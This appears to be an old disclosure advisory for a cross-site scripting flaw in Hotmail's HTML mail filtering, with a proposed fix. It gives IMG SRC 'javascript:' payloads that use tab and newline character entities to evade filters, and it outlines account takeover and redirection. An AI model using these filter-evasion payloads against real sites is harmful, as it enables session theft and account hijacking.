####################[Introduction]####################
This document for written to bring attention to security flaws within the 
Microsoft Hotmail email system. As we have seen dozens of times
before, javascript poses a security danger to web applications, especially 
when
not properly protected.

####################[Scope]####################
The scope of this problem will most likely affect any and all browsers that
have javascript turned on by default. Now lets see here....

That covers all major operating systems. (Windows, MacOS, *nix)
and covers both major browsers. (Internet Explorer 3,4,5 and Netscape 2,
3,4 and 5!?)

So we can safely assume everyone who currently uses Hotmail is at risk regardless 
of 
their current software. Unless there are a few die-hards who use lynx to 
check
thier hotmail account. 


####################[Detailed Exploit]####################
The following line will execute a line of JavaScript Code. This
browser feature has been well documented elsewhere.

<IMG SRC="javascript:alert('GameOver, Hax0rs win!');">   /* Example, not 
actual exploit */

<IMG SRC="javasc&#010;ript:alert('test');">
Delimiting the string with some HTML Ascii Code Entities will also still 
execute.
\09 \10 \11 \12 \13 as delimiters all work.

/* Actual Exploit */
<IMG SRC="javasc&#09;ript:alert('test');">


For the script kiddy: (You must send the mail as HTML mail).

####################[Potential Disasters]####################
The limit to the disastrous consequences of this are limited only to the 
skill
and creativity of intruder. So, lets give some examples shall we:

1) Hotmail Account take over. Yes, attacker can gain both username and password
or whatever Hotmail uses to track the session. Not like it matters.

2) Use exploit in conjunction with a KNOWN browser exploits to access the 
system.
Hmm. I wonder if JS can be used to exploit an IE security bug, writing a 
file
to the system (Can you say "I LOVE YOU"?), and then execute that file. Seems 
possible.

3) Re-Direct the user to somewhere else they want. 
Wow, wouldn't spammers just love to be able to re-direct a massive amount 
of
Hotmail users to some Pr0n site. HAH!

Remember, limited only in creativity.

####################[Suggested Fix]####################
The silver bullet fix would be that Microsoft would take security and the
privacy of its customers seriously with a proactive approach rather than 
deny
and post a patch approach.

However, given that is an unreasonable request, we suggest the following:
Removethe ALL carriage returns from string before analyzing it.
